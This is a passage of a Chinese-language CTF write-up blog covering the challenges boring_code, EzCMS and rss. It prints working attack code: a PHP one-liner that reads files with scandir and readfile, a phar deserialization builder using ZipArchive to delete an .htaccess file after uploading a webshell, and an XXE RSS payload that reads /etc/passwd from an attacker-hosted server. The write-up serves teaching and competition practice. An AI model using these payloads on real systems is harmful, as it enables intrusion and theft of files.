flag!"</span>;int(<span class="hljs-number">54</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>前面后面我们都打通了，现在唯一缺的就是如何把<code>chdir</code>返回的<code>bool(true)</code>变成<code>.</code>以便<code>scandir</code>函数调用的问题了。</p><p>经过 @rmb122 师傅的发掘，<code>microtime</code>可以接受一个<code>bool(true)</code>参数，并返回当前 Unix 时间戳和微秒数</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(microtime(<span class="hljs-keyword">true</span>));</span><br><span class="line">float(<span class="hljs-number">1568657564.377</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>乍一看没什么用，但是我们依然可以配合<code>chr</code>函数来进行 ascii 码转换，当时间到了指定时间，我们就可以拿到<code>.</code>字符了！于是这样一开始如何构造最开始的<code>.</code>这个问题也可以解决了！</p><p>于是整个 payload 就是：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(microtime(chdir(next(scandir(chr(time())))))))));</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个方法的缺点也比较明显，需要爆破…于是我用 intruder 爆了一下，运气也比较好，5s 就出来了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190917021622.png" alt=""></p><h2 id="EzCMS"><a href="#EzCMS" class="headerlink" title="EzCMS"></a>EzCMS</h2><p>这个题不想评价太多…拿我出的 SUCTF upload labs 2 来魔改的题，这里就简要说说点，不再详细赘述了。</p><p>这个题也是个上传的环境，但是上传有一个限制以及还有一个可疑的<code>__call</code>魔术方法</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $username;</span><br><span class="line">    <span class="hljs-keyword">public</span> $password;</span><br><span class="line">    <span class="hljs-keyword">public</span> $admin;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;username = $_SESSION[<span class="hljs-string">'username'</span>];</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;password = $_SESSION[<span class="hljs-string">'password'</span>];</span><br><span class="line">        $secret = <span class="hljs-string">"********"</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-string">"admin"</span>){</span><br><span class="line">            <span class="hljs-keyword">if</span> ($_COOKIE[<span class="hljs-string">'user'</span>] === md5($secret.<span class="hljs-keyword">$this</span>-&gt;username.<span class="hljs-keyword">$this</span>-&gt;password)){</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span><span class="hljs-params">($name, $arguments)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;admin-&gt;open(<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-keyword">$this</span>-&gt;password);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里可以用 hash 长度拓展来绕过，hashpump 就行。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $file_tmp, $size)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;upload_dir = <span class="hljs-string">'sandbox/'</span>.md5($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);</span><br><span class="line">  <span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-keyword">$this</span>-&gt;upload_dir)){</span><br><span class="line">    mkdir(<span class="hljs-keyword">$this</span>-&gt;upload_dir, <span class="hljs-number">0777</span>, <span class="hljs-keyword">true</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (!is_file(<span class="hljs-keyword">$this</span>-&gt;upload_dir.<span class="hljs-string">'/.htaccess'</span>)){</span><br><span class="line">    file_put_contents(<span class="hljs-keyword">$this</span>-&gt;upload_dir.<span class="hljs-string">'/.htaccess'</span>, <span class="hljs-string">'lolololol, i control all'</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;size = $size;</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;file_tmp = $file_tmp;</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;content_check = <span class="hljs-keyword">new</span> Check(<span class="hljs-keyword">$this</span>-&gt;file_tmp);</span><br><span class="line">  $profile = <span class="hljs-keyword">new</span> Profile();</span><br><span class="line">  <span class="hljs-keyword">$this</span>-&gt;checker = $profile-&gt;is_admin();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然可以上传任意后缀的文件，但是上传目录下有被控制的<code>.htaccess</code>，导致我们上传的 php 文件不能解析，而且每次登录都会生成这个<code>.htaccess</code>文件，不能被绕过。</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>{</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">  </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;checker)){</span><br><span class="line">      <span class="hljs-keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>整个题唯一一个<code>__destruct</code>函数，不用猜就知道是利用这个点</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>{</span><br><span class="line">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_detail</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span>, <span class="hljs-keyword">$this</span>-&gt;filepath)){</span><br><span class="line">      <span class="hljs-keyword">die</span>(<span class="hljs-string">"nonono~"</span>);</span><br><span class="line">    }</span><br><span class="line">    $mine = mime_content_type(<span class="hljs-keyword">$this</span>-&gt;filepath);</span><br><span class="line">    $store_path = <span class="hljs-keyword">$this</span>-&gt;open(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;filepath);</span><br><span class="line">    $res[<span class="hljs-string">'mine'</span>] = $mine;</span><br><span class="line">    $res[<span class="hljs-string">'store_path'</span>] = $store_path;</span><br><span class="line">    <span class="hljs-keyword">return</span> $res;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里是一个很明显的 phar 反序列化的点，触发函数是<code>mime_content_type</code>，触发流是<code>php://filter</code>。</p><p>整个题的意思也比较明显，但是一开始不是很 get 到点，给出的那个<code>__call</code>魔术方法有点莫名其妙，然后一直去日<code>move_uploaded_file</code>方法去了，结果发现这个根本日不动。然后经过马师傅的提醒，get 了一个 <a href="https://www.php.net/manual/en/ziparchive.open.php" target="_blank" rel="noopener">ZipArchive::open</a> 函数，然后一切就明白了，随手一搜就是个原题魔改题 <a href="https://www.anquanke.com/post/id/95896" target="_blank" rel="noopener">Insomni’hack Teaser 2018比赛Write Up：File Vault题目</a>，可以使用 ZipArchive-&gt;open 方法达到删除目标文件。</p><p>所以整个利用链就比较清晰了， hash 拓展绕过上传限制，上传一个 webshell ，再构造一个 ZipArchive 类的 phar 包上传，用<code>php://filter/resource=phar://</code>触发 phar 反序列化删除自己目录下的<code>.htaccess</code>文件，直接 getflag 。</p><p>构造 phar 包的代码如下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Check</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename)</span></span></span><br><span class="line"><span class="hljs-function">    </span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filepath;</span><br><span class="line">    <span class="hljs-keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $size;</span><br><span class="line">    <span class="hljs-keyword">public</span> $checker;</span><br><span class="line">    <span class="hljs-keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="hljs-keyword">public</span> $filename;</span><br><span class="line">    <span class="hljs-keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="hljs-keyword">public</span> $content_check;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> $username = <span class="hljs-string">"/var/www/html/sandbox/9607fe6aa978f6811eb3fe830b544771/.htaccess"</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $password = <span class="hljs-string">"9"</span>;</span><br><span class="line">    <span class="hljs-keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> $a = <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">unlink(<span class="hljs-string">"1.phar"</span>);</span><br><span class="line"></span><br><span class="line">$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"1.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="hljs-comment">// <span class="hljs-meta">&lt;?php</span> __HALT_COMPILER();</span></span><br><span class="line">$phar-&gt;setStub(<span class="hljs-string">"GIF89a"</span> . <span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span></span><br><span class="line">$a = <span class="hljs-keyword">new</span> ZipArchive();</span><br><span class="line">$b = <span class="hljs-keyword">new</span> Profile();</span><br><span class="line">$b-&gt;admin = $a;</span><br><span class="line">$o = <span class="hljs-keyword">new</span> File();</span><br><span class="line">$o-&gt;checker = $b;</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); </span><br><span class="line">    <span class="hljs-comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h2><p>根据题目名字，因为 rss 本身也是个 XML ，这里的考点之一肯定就是 xxe 了。</p><p>于是直接拿一个 rss xxe 模版来改一下</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">title</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">title</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"2.0"</span> </span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">xmlns:atom</span>=<span class="hljs-string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>先知安全技术社区<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>http://xz.aliyun.com/forum/<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>先知安全技术社区<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">atom:link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://xz.aliyun.com/forum/feed/"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"self"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">atom:link</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">language</span>&gt;</span>zh-hans<span class="hljs-tag">&lt;/<span class="hljs-name">language</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">lastBuildDate</span>&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class="hljs-tag">&lt;/<span class="hljs-name">lastBuildDate</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>http://xz.aliyun.com/t/6223<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>CVE-2018-14418 擦出新火花<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">pubDate</span>&gt;</span>Sun, 08 Sep 2019 10:15:41 +0800<span class="hljs-tag">&lt;/<span class="hljs-name">pubDate</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">guid</span>&gt;</span>http://xz.aliyun.com/t/6223<span class="hljs-tag">&lt;/<span class="hljs-name">guid</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Url_parse 可以按照上面 boring_code 那题使用<code>,</code>来绕过，在自己的端口起个 http 服务，放上面的 xml 文件就行了，类似<code>http://your_vps:80,baidu.com:80/file</code></p><p>成功读到<code>/etc/passwd</code>，但是读不到<code>/flag</code>，接着用 php 伪协议读题目源码：</p><p>index.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="hljs-string">'display_errors'</span>,<span class="hljs-number">0</span>);</span><br><span class="line">ini_set(<span class="hljs-string">'display_startup_erros'</span>,<span class="hljs-number">1</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">'routes.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span><span class="hljs-params">($class_name)</span></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">'./classes/'</span>.$class_name.<span class="hljs-string">'.php'</span>)) {</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">require_once</span> <span class="hljs-string">'./classes/'</span>.$class_name.<span class="hljs-string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">'./controllers/'</span>.$class_name.<span class="hljs-string">'.php'</span>)) {</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">require_once</span> <span class="hljs-string">'./controllers/'</span>.$class_name.<span class="hljs-string">'.php'</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>routes.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">Route::set(<span class="hljs-string">'index.php'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    Index::createView(<span class="hljs-string">'Index'</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">Route::set(<span class="hljs-string">'index'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    Index::createView(<span class="hljs-string">'Index'</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">Route::set(<span class="hljs-string">'fetch'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'rss_url'</span>])){</span><br><span class="line">        Fetch::handleUrl($_REQUEST[<span class="hljs-string">'rss_url'</span>]);</span><br><span class="line">    }</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">Route::set(<span class="hljs-string">'rss_in_order'</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span>{</span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'rss_url'</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_REQUEST[<span class="hljs-string">'order'</span>])){</span><br><span class="line">        Admin::createView(<span class="hljs-string">'Admin'</span>);</span><br><span class="line">    }<span class="hljs-keyword">else</span>{</span><br><span class="line">      <span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] == <span class="hljs-string">'127.0.0.1'</span> || $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] == <span class="hljs-string">'::1'</span>){</span><br><span class="line">        Admin::sort($_REQUEST[<span class="hljs-string">'rss_url'</span>],$_REQUEST[<span class="hljs-string">'order'</span>]);</span><br><span class="line">      }<span class="hljs-keyword">else</span>{</span><br><span class="line">       <span class="hljs-keyword">echo</span> <span class="hljs-string">";("</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>controllers/Admin.php</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>{</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sort</span><span class="hljs-params">($url,$order)</span></span>{</span><br><span class="line">        $rss=file_get_contents($url);</span><br><span class="line">        $rss=simplexml_load_string($rss,<span class="hljs-string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">        <span class="hljs-keyword">require_once</span> <span class="hljs-string">'./views/Admin.php'</span>;</span><br><span class="line">    